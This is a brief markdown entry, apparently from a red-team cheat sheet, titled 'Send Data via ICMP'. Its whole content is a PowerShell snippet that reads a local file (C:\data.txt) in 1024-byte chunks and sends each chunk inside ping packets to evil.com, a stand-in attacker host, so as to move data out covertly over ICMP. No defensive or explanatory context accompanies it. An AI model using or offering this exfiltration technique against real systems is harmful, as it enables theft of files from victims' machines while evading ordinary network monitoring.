# Send Data via ICMP

- Ping

    ```powershell
    $ping = New-Object System.Net.Networkinformation.ping
    foreach($Data in Get-Content -Path C:\data.txt -Encoding Byte -ReadCount 1024) {$ping.Send("evil.com", 1500, $Data)}
    ```